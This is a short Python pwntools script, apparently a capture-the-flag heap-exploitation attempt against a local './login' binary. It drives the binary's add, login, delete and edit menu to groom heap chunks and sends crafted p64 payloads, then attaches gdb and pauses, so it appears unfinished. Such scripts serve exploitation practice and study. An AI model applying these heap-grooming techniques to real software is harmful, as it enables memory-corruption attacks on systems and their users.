from pwn import *

context.terminal = ['/usr/bin/gdb', '-q', './login', '53610']
p = process('./login')
elf = ELF('./login')
passwd = b'a' * 0x40


def choice(id_):
    p.recvuntil(b'>>')
    p.sendline(id_)


def add(id_, size_, len_, mess):
    choice(b'1')
    p.recvuntil(b':')
    p.sendline(id_)
    p.recvuntil(b':')
    p.sendline(str(int(size_)).encode())
    p.recvuntil(b':')
    p.sendline(str(int(len_)).encode())
    p.recvuntil(b':')
    p.sendline(mess)


def log_in(id_, mess):
    choice(b'2')
    p.recvuntil(b':')
    p.sendline(id_)
    p.recvuntil(b':')
    p.sendline(mess)


def delete(id_):
    choice(b'3')
    p.recvuntil(b':')
    p.sendline(id_)


def edit(id_, len_, mess):
    choice(b'4')
    p.recvuntil(b':')
    p.sendline(id_)
    p.recvuntil(b':')
    p.sendline(str(int(len_)).encode())
    p.recvuntil(b':')
    p.sendline(mess)


def make_cat(size_, payload):
    add(b'3', size_, 0x40, passwd)
    add(b'4', 0x420, 0x40, payload)
    log_in(b'3', passwd)
    log_in(b'4', payload)
    delete(b'3')
    delete(b'4')

add(b'1', 0x1ff0, 0x40, passwd)
add(b'2', 0x420, 0x40, passwd)
log_in(b'1', passwd)
delete(b'1')

payload = p64(0) * 5 + b'a' * 8 + p64(0) * 2
make_cat(0x4a0, payload)

payload = p64(0) * 4 + p64(1) + p64(2) + b'a' * 8 + b'b' * 8
make_cat(0x460, payload)


gdb.attach(p)
pause()
p.interactive()